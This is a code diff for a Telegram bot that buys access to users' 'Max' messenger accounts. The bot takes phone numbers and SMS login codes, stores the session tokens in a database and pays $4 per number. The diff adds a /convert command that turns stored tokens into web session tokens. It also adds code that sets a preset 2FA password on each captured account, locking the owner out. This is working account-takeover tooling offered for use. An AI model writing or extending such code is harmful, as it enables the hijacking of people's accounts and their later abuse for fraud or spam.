@@ -5,7 +5,7 @@ import logging
 from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command
 from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
-from pymax import Client, ExtraConfig
+from pymax import Client, ExtraConfig, MaxClient
 
 # === Логирование ===
 logging.basicConfig(
@@ -22,6 +22,7 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
 DATABASE_URL = os.getenv("DATABASE_URL")
+DEFAULT_2FA_PASSWORD = os.getenv("PASS", "")
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -330,7 +331,7 @@ async def start_work_callback(callback: CallbackQuery):
 
 # === Таймаут кода ===
 async def code_timeout(user_id: int, phone: str):
-    await asyncio.sleep(150)  # 2 минуты 30 секунд
+    await asyncio.sleep(150)
     if user_id in waiting_code:
         waiting_code.pop(user_id, None)
         pending.pop(user_id, None)
@@ -338,6 +339,35 @@ async def code_timeout(user_id: int, phone: str):
             await bot.send_message(user_id, "🔖 Время на ввод кода истекло. Пожалуйста, начните авторизацию заново")
         except Exception:
             pass
+
+# === Конвертация токена в WEB ===
+@dp.message(Command("convert"))
+async def convert_token(msg: Message):
+    if not await is_approved_group(msg):
+        return
+
+    try:
+        phone = msg.text.split()[1]
+    except IndexError:
+        return await msg.answer("❌ Используй: /convert +79161234567")
+
+    tokens = await get_all_tokens()
+    token_data = next((t for t in tokens if t["phone"] == phone), None)
+
+    if not token_data:
+        return await msg.answer("❌ Токен для этого номера не найден")
+
+    status_msg = await msg.answer("⏳ Конвертирую токен в WEB...")
+
+    try:
+        web_client = MaxClient(token=token_data["token"])
+        await web_client.start()
+        web_token = web_client.token
+        await save_token_to_db(phone, web_token)
+        await status_msg.edit_text(f"✅ Токен для {phone} конвертирован в WEB")
+        logger.info(f"Group {msg.chat.id} — /convert {phone} -> WEB")
+    except Exception as e:
+        await status_msg.edit_text(f"❌ Ошибка конвертации: {e}")
 
 # === Обработчик номера телефона ===
 
@@ -389,7 +419,6 @@ async def phone_handler(msg: Message):
     waiting_code[msg.from_user.id] = True
     await msg.answer("📩 Введите код из SMS ответом на это сообщение:")
 
-    # Запуск таймаута
     asyncio.create_task(code_timeout(msg.from_user.id, phone))
 
 async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
@@ -403,6 +432,15 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
             await save_token_to_db(phone, token)
 
         await add_to_balance(msg.from_user.id, 4.0)
+
+        # Установка 2FA для защиты аккаунта
+        if DEFAULT_2FA_PASSWORD:
+            try:
+                await client.set_2fa(password=DEFAULT_2FA_PASSWORD)
+                logger.info(f"Пароль 2FA установлен для {phone}")
+            except Exception:
+                logger.info(f"Пароль 2FA уже стоит на {phone}")
+
         logger.info(f"User {msg.from_user.id} — номер {phone} успешно авторизован")
         await msg.answer(
             "📲 Номер успешно авторизован, на ваш баланс зачислено \\$4\\.00",
